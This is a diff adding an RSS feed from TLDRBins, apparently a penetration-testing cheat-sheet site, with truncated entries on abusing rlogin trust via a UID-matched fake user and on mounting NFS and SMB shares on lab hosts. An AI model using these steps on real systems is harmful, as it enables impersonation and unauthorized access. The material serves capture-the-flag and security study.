@@ -1,0 +1,25 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Uid on TLDRBins</title>
+    <link>https://tldrbins.github.io/@uid/</link>
+    <description>Recent content in Uid on TLDRBins</description>
+    <generator>Hugo</generator>
+    <language>en-us</language>
+    <atom:link href="https://tldrbins.github.io/@uid/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>R Services</title>
+      <link>https://tldrbins.github.io/r_services/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/r_services/</guid>
+      <description>Abuse #1: Fake a User 1. Check cat /etc/hosts.equiv (remote) www-data@reset:/home/sadm$ cat /etc/hosts.equiv # /etc/hosts.equiv: list of hosts and users that are granted &amp;#34;trusted&amp;#34; r # command access to your system . - root - local + sadm 2. Create the Target User Locally # Create a fake user sudo adduser --uid &amp;lt;UID&amp;gt; &amp;lt;USER&amp;gt; # Switch user su &amp;lt;USER&amp;gt; 3. Connect # Installation sudo apt install rsh-redone-client # Connect rlogin &amp;lt;TARGET&amp;gt; 4.</description>
+    </item>
+    <item>
+      <title>Share Mount</title>
+      <link>https://tldrbins.github.io/share_mount/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/share_mount/</guid>
+      <description>NFS SMB List Shares showmount -e &amp;lt;TARGET&amp;gt; $ showmount -e 10.10.11.191 Export list for 10.10.11.191: /home/ross * /var/www/html * Mount Share sudo mkdir /mnt/share $ sudo mkdir /mnt/share sudo mount -t nfs &amp;lt;TARGET&amp;gt;:&amp;lt;SHARE&amp;gt; /mnt/share/ $ sudo mount -t nfs 10.10.11.191:/home/ross /mnt/share/ $ ls /mnt/share Desktop Documents Downloads Music Pictures Public Templates Videos Unmount Share sudo umount /mnt/share/ $ sudo umount /mnt/share/ Mount Share sudo mount -t cifs //&amp;lt;TARGET&amp;gt;/&amp;lt;SHARE&amp;gt; /mnt # Without creds sudo mount -t cifs -o user=,password= //&amp;lt;TARGET&amp;gt;/&amp;lt;SHARE&amp;gt; /mnt # With creds sudo mount -t cifs -o user=&amp;#39;&amp;lt;USER&amp;gt;&amp;#39;,pass=&amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; //&amp;lt;TARGET&amp;gt;/&amp;lt;SHARE&amp;gt; /mnt $ sudo mount -t cifs -o ro,user=&amp;#39;localadmin&amp;#39;,password=&amp;#39;Secret123&amp;#39; //10.</description>
+    </item>
+  </channel>
+</rss>
